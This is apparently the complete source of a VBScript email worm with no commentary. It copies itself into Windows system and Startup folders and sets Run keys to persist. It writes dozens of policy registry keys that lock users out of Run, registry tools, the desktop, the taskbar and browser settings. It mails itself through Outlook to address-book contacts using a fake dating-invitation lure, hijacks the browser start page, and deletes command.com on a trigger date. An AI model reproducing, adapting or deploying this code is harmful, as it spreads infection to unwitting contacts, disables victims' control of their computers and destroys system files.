On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set fs = CreateObject("Scripting.FileSystemObject")
Set dir1 = fs.GetSpecialFolder(0)
Set dir2 = fs.GetSpecialFolder(1)
Set so = CreateObject("Scripting.FileSystemObject")
Dim r
Set r = CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\不见不散.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir2&"\不见不散.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\启动\不见不散.vbs")
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 63000000, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", ""
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\不见不散", "不见不散.vbs"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\CLASSES\.reg\", "txtfile"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption", "不可不戒"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText", "不见不散！"
Set ol = CreateObject("Outlook.Application")
On Error Resume Next
For x = 1 To 5
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject = "今晚你来吗？"
Mail.Body = "朋友你好：您的朋友Rose给您发来了热情的邀请。具体情况请阅读随信附件，祝您好运！            同城约会网"
Mail.Attachments.Add(dir2&"不见不散.vbs")
Mail.Send
Next
ol.Quit
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock", 1, "REG_DWORD"
r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page", "http://hxci.com.cn/jisu"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu", 1, "REG_DWORD"
If Date = #01/01/2003# Then
Of.DeleteFile ("C:\command.com")
End If